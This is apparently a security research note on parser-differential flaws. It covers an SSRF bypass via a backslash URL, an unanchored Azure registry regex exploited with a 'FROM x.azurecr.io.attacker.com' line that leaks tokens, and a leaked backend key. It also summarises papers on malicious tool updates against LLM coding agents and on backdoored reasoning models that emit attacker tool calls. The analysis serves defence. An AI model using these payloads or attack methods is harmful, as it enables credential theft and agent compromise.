---
title: Parser differentials — when the thing that checks the bytes and the thing that executes them read the string differently
topic: parser-differential
created: 2026-11-03
---

# Parser differentials — the check and the executor read different bytes

A class that recurred five times in one batch (2026-11-03 20:22): **the security property was
implemented in one component that parses the input, and the effect happened in another component
that parses it again.** Every case below passes a naive test of the guard — the guard is present,
the rule is written down, the reviewer approved it — and fails on the artifact, because the two
components disagree about what the string *is*.

Adjacent files: [[security]] (the CVE shelf this extends), [[vuln-supply]] (record provenance and
ranges), [[harness-reliability]] (the same seam inside an agent harness), [[fact-check]] (a quoted
number and the artifact it came from), [[disclosure-lag]] (when the fix shipped versus the record).

**The claim:** wherever a boundary is enforced by *parsing*, the unit of analysis is not the rule
but the **pair** — which parser enforces, which parser executes, and whether they are the same
code. A rule with one parser is a check; a rule with two parsers is a hope.

## 1. SSRF: `urlparse` checks one host, `urllib3` dials another

`CVE-2026-120630` (CrewAI, CERT/CC CNA, published **2026-11-02T17:37:05Z**, ID reserved
**17:35:36Z** — 89 seconds). For `http://127.0.0.1:8080\@1.1.1.1/`:

| parser | username | host |
|---|---|---|
| `urllib.parse.urlparse` | `127.0.0.1:8080\` | **1.1.1.1** |
| `urllib3.util.parse_url` | — | **127.0.0.1** |

Python's stdlib treats the backslash as an ordinary userinfo character; urllib3 treats it as a
separator. So the guard approves a request against the *external* host the attacker wrote down and
the socket connects to the internal one the guard never saw. Verified first-hand in the record:

- `affected[]` = `{version: "0", lessThan: "1.15.17", versionType: "custom"}`, product **CrewAI**
  (the fix landed in `crewai-tools`).
- `problemTypes` is **free text** — `"CWE-918 Server-Side Request Forgery (SSRF)"` with **no
  `cweId`** populated. A CWE-presence check reads this record as CWE-less.
- **No `metrics` key at all** in the CNA container, **0 metrics** on NVD, status **`Deferred`** —
  so "CVSS" has no value from any party here. This is provenance case (4)-adjacent: not a
  policy refusal, simply nobody scored it.
- The fix is **PR #6981**, "fix(tools): pin SSRF fetches to the validated peer IP", merged
  **2026-08-17** — **77 days** before the record — and its stated target is *not* the backslash:
  the fetch "did not connect to the IP that `validate_url` checked", because urllib3 re-resolves
  DNS when it opens the socket. The backslash case closes as a side effect of pinning at
  connect time.

The same author found the identical shape in IBM's Langflow: `CVE-2026-19304`, **7.7**
(`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`, `CWE-918`), NVD `Analyzed` with a single
`psirt@us.ibm.com` metric and **0 `nvd@nist.gov`** rows — the endorsement case, not an NVD score.
Langflow has **6** KEV entries (`CVE-2025-3248` … `CVE-2026-9198`, checked against the catalog);
**`CVE-2026-19304` is in none of them** — KEV tracks the product, not the CVE.

**The transferable check:** a denylist is only as strong as the **narrowest** of the parsers in the
path. Test the guard with strings the *executor* re-parses, not with `127.0.0.1` as a literal.

## 2. A regex with no anchors is a suffix match

`CVE-2026-105769` (kaniko before **1.25.20**, Chainguard CNA, reserved 2026-10-05T19:21Z,
published **2026-11-02T16:49Z**, fix tag `v1.25.20` **2026-10-27T19:05Z** — 6 days earlier).
kaniko hands any registry it has no credentials for to
`docker-credential-acr-env`, whose test is:

```
.*\.azurecr\.io|.*\.azurecr\.cn|.*\.azurecr\.de|.*\.azurecr\.us
```

Unanchored, so **any hostname containing** `.azurecr.io` matches — `x.azurecr.io.attacker.com`
included. A Dockerfile `FROM x.azurecr.io.attacker.com/img` (or `COPY --from=`) makes the helper
fetch the build's Azure identity (service-principal env vars, federated workload-identity token, or
managed identity) and **POST it to the attacker's host twice** — as `Authorization: Bearer` and as
the `access_token` form field. Score **9.3** (`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`), `CWE-346` +
`CWE-522`, `chainguard`'s metric, NVD `Awaiting Analysis` with **0 NVD-scored metrics**.

The artifact split is the lesson: kaniko **vendors** the helper under `third_party/` and fixed its
own copy, so kaniko releases are safe while the dependency is not —
`chrismellard/docker-credential-acr-env` issue **#21**, "Azure AD token disclosed to
attacker-controlled hosts: ACR hostname pattern is unanchored", filed **2026-08-13** and still
**open** (verified 2026-11-03). Anything else importing that helper still has the hole.

## 3. One key for every infrastructure, leaked through a fetch the frontend was allowed to make

`CVE-2026-89292` (Eclipse Mnestix Browser **1.6.0 → <2.3.0**): an unauthenticated caller could
exfiltrate `MNESTIX_BACKEND_API_KEY` **for all configured Infrastructures**. **9.2 CVSS 4.0**
(`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` — confidentiality only, high on both the
vulnerable and the subsequent system), `CWE-918` **and** `CWE-522`, `emo@eclipse.org`'s metric,
NVD **`Received`** with 0 metrics. The two CWEs together name the shape: the key leaked through an
SSRF the browser frontend was permitted to perform on the caller's behalf, and the credential was
insufficiently protected — a **single** key for every endpoint the deployment was wired to, so the
blast radius is the whole integration, not the host that was touched.

Dates are a backfill, verified in the container: ID reserved **2026-09-11T12:47:13Z**, fix
**2.3.0** on **2026-09-10T13:59Z** (the day *before* the reservation), record published
**2026-11-03T09:31:27Z** — **54 days** after the fix. Newest release at check: **2.4.1**
(2026-11-02T14:16Z). The record's references are two GitLab work items and no vendor advisory page,
so `descriptions[]` is the entire public statement.

## 4. The scorer is a parser too: 22 points on identical outputs

arXiv **2611.03377** ("Same Outputs, Different Scores", submitted 2026-11-02). Eight peer-reviewed
multimodal benchmarks' official scorers, five open VLMs on one 16 GB GPU, adjudicated by a blinded
human+LLM-judge process (Cohen's **κ = 0.956**). Verbatim from the abstract:

> "The scoring rule alone moves accuracy by up to 22 points on identical outputs, yet exactly 0
> wherever a model emits clean option letters, so it hides on strong-model leaderboards."

The damage is in the **fallback**, not in the rambling: the benchmark with the most non-compliant
responses has a scoring artifact of exactly **zero** (its scorer abstains rather than guesses), while
a reasoning model with **0.000** measured non-compliance still swings **9.5 points** on *which regex
match of its trace the parser keeps*. None of the three standard strategies is safe — snapping to
the nearest option credits answers never given, abstention discards correct answers stated in words,
likelihood scoring follows answer-token priors. So a published score is **capability × the parser's
luck**, and the error is invisible exactly where reviewers look (the frontier rows).

## 5. Approval is admission-time; the bytes change after it

arXiv **2611.01976** ("Beyond Prompt Injection: The Tool Update Gap in LLM Agent Security",
submitted 2026-11-01). **ETUDE** embeds malicious functionality into an *update* of an initially
benign tool while preserving its legitimate behaviour. No adversarial instruction exists, so every
defence that inspects model-visible content — prompt-injection detectors, skill review, static
scanning — has nothing to look at: the updated code executes **outside the context window**.

Seven frameworks (Gemini CLI, Codex CLI, Claude Code, DeepSeek Harness, OpenCode, Pi, Goose), three
tool functionalities, three unauthorised objectives: **97.6% ASR** at **95.9%** legitimate task
completion, **85.1%** above the strongest prompt-injection baseline. The authors' own scope limit,
greppable in the full text:

> "We demonstrate attacks with researcher-authored tool implementations with carefully monitored
> permissions instead of modifying open-source tools in the wild, to avoid potential ethical
> issues."

And the sentence that names the gap: when a framework requires confirmation, "the harness supplies a
one-time approval for that call; this does not re-examine the updated implementation." Their fix is
runtime enforcement of an out-of-band least-privilege tool policy — **deny at execution**, not at
admission. Note the design implication: **re-approval on tool change** is the cheapest control, and
it is not a model-side control at all.

## 6. The backdoor arrives as a *better* checkpoint — and lives in the reasoning trace

arXiv **2611.00138** (Kerkoporta, submitted 2026-10-29). Structured-output backdoors: a trigger
anywhere in the context makes a reasoning model emit an attacker-chosen **tool call**, which the
harness executes. Implanted by SFT on distilled trajectories (Qwen3.5-122B-A10B teacher, ~15k coding
tasks), victims Qwen3.5-4B and 9B across Claude Code, Codex and Pi, three payloads spanning
confidentiality / integrity / availability. Headline: success **up to 96.2%**.

Two findings to carry:

- **The utility claim is one cell.** The abstract's "The resulting models can outperform the clean
  baseline on standard utility benchmarks" is true of one row — 4B on TerminalBench-Lite
  **excluding timeouts** (clean **42.8** → backdoored **58.4**, +15.6) — while the same checkpoint
  is **below** baseline on SWE-bench Verified (40.9 vs 42.9; 51.1 vs 51.8) and the 9B never exceeds
  its baseline in any reported configuration. A poisoned weight release would therefore arrive
  looking *better* on whatever benchmark you check.
- **The generalisation lives in the chain of thought, not in the trigger.** Removing the
  trigger/payload acknowledgement from the reasoning trace takes out-of-distribution ASR from
  **94.8–84.1%** down to **1.0–0.0%**. So the trace is the artifact a screen has to read — and the
  same trace is exactly what a policy of hiding CoT (thesis 9) removes from view.

## The checklist this batch produces

1. **Name both parsers.** Which component *checks*, which *executes*, and do they share code? A
   regex with no `^`/`$`, a stdlib parser against a library parser, a scorer's regex against a
   model's prose — all one class.
2. **Ask what the guard binds to.** A hostname string, a tool's identity at install time, or an
   approval token that does not cover the implementation that will run.
3. **Ask where the fix landed.** In the product that vendored the dependency (kaniko) or in the
   dependency everything else imports (still open, #21)?
4. **For a benchmark number, ask which rule produced it** and whether the model even emits the
   format the rule was written for — the error is zero on strong models, which is why it survives.
5. **For a poisoned model, do not watch for a quality drop.** Screen behaviour under the harness it
   will actually run in, plus provenance; the trace is the readable surface.
